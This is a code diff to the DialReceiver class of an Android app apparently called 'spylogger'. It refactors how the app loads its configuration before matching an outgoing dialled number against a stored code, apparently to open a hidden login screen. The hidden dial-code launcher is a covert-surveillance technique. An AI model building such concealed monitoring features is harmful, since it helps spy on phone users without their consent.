@@ -4,13 +4,14 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 
-import com.gravatasufoca.spylogger.utils.Utils;
+import com.gravatasufoca.spylogger.activities.LoginActivity;
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
 import com.gravatasufoca.spylogger.model.Configuracao;
-import com.gravatasufoca.spylogger.activities.LoginActivity;
+import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
+import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
+import com.gravatasufoca.spylogger.utils.Utils;
 
 import java.sql.SQLException;
-import java.util.List;
 
 
 public class DialReceiver extends BroadcastReceiver {
@@ -19,15 +20,11 @@ public class DialReceiver extends BroadcastReceiver {
 
 		DatabaseHelper database = new DatabaseHelper(
 				context);
-		List<Configuracao> confs;
 		try {
-			confs = database.getConfiguracaoDao().queryForAll();
+			RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
 
-			Configuracao conf = null;
+			Configuracao conf = repositorioConfiguracao.getConfiguracao();
 
-			if (confs.size() > 0) {
-				conf = confs.get(0);
-			}
 			if (conf != null) {
 				String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
 				String compare_num = conf.getDialer();
